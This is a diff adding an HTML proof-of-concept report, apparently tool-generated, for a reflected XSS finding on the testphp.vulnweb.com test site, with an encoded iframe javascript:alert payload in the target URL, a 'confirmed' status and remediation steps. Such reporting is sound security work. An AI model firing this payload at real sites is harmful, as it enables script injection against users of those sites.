@@ -1,0 +1,109 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS PoC - Reflected_XSS</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .header {
+            background: #dc3545;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .detail {
+            margin: 10px 0;
+            padding: 10px;
+            background: #f8f9fa;
+            border-left: 4px solid #007bff;
+        }
+        .payload {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        .url {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        .warning {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🚨 XSS Vulnerability PoC</h1>
+            <p>Proof of Concept for Reflected_XSS</p>
+        </div>
+        
+        <div class="detail">
+            <strong>Vulnerability Type:</strong> Reflected_XSS
+        </div>
+        
+        <div class="detail">
+            <strong>Target URL:</strong>
+            <div class="url">http://testphp.vulnweb.com/search.php?searchFor=test?type=%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C/iframe%3E</div>
+        </div>
+        
+        <div class="detail">
+            <strong>Payload Used:</strong>
+            <div class="payload">&lt;iframe src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;&lt;/iframe&gt;</div>
+        </div>
+        
+        <div class="detail">
+            <strong>Timestamp:</strong> 2025-09-06 11:32:00
+        </div>
+        
+        <div class="detail">
+            <strong>Status:</strong> <span style="color: #dc3545; font-weight: bold;">VULNERABILITY CONFIRMED</span>
+        </div>
+        
+        <div class="warning">
+            <strong>⚠️ Security Notice:</strong> This is a proof of concept for a confirmed XSS vulnerability. 
+            The payload above has been verified to execute in the target application. 
+            Please ensure this vulnerability is patched immediately.
+        </div>
+        
+        <div class="detail">
+            <strong>Next Steps:</strong>
+            <ul>
+                <li>Report this vulnerability to the application owner</li>
+                <li>Implement proper input validation and output encoding</li>
+                <li>Use Content Security Policy (CSP) headers</li>
+                <li>Regular security testing and code review</li>
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
+            
